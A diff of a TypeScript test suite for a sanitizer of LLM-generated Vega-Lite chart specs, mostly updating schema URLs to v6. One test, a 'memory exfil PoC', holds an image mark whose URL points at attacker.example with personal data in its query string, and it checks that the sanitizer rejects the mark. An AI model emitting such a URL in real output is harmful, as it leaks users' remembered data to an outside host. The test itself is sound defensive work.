@@ -1,9 +1,9 @@
-import { sanitizeVegaSpec, VegaSpecParseError, VegaSpecSecurityError } from './sanitizeVegaSpec';
 import { PROTON_BAR_COLOR } from './protonVegaTheme';
+import { VegaSpecParseError, VegaSpecSecurityError, sanitizeVegaSpec } from './sanitizeVegaSpec';
 
 describe('sanitizeVegaSpec', () => {
     const validSpec = JSON.stringify({
-        $schema: 'https://vega.github.io/schema/vega-lite/v5.json',
+        $schema: 'https://vega.github.io/schema/vega-lite/v6.json',
         description: 'Sample chart',
         data: {
             values: [
@@ -101,7 +101,7 @@ describe('sanitizeVegaSpec', () => {
 
     it('accepts unquoted object keys from LLM output', () => {
         const spec = `{
-            "$schema": "https://vega.github.io/schema/vega-lite/v5.json",
+            "$schema": "https://vega.github.io/schema/vega-lite/v6.json",
             "width": "container",
             "data": {
                 "values": [
@@ -140,7 +140,7 @@ describe('sanitizeVegaSpec', () => {
 
     it('repairs double-wrapped objects in data.values arrays', () => {
         const spec = `{
-            "$schema": "https://vega.github.io/schema/vega-lite/v5.json",
+            "$schema": "https://vega.github.io/schema/vega-lite/v6.json",
             "width": "container",
             "data": {
                 "values": [
@@ -212,7 +212,7 @@ describe('sanitizeVegaSpec', () => {
 
     it('rejects image marks that exfiltrate data via encoding.url (memory exfil PoC)', () => {
         const spec = JSON.stringify({
-            $schema: 'https://vega.github.io/schema/vega-lite/v5.json',
+            $schema: 'https://vega.github.io/schema/vega-lite/v6.json',
             data: {
                 values: [{ x: 1, y: 1, img: 'https://attacker.example/badge.png?d=Sebastian+Argentina' }],
             },
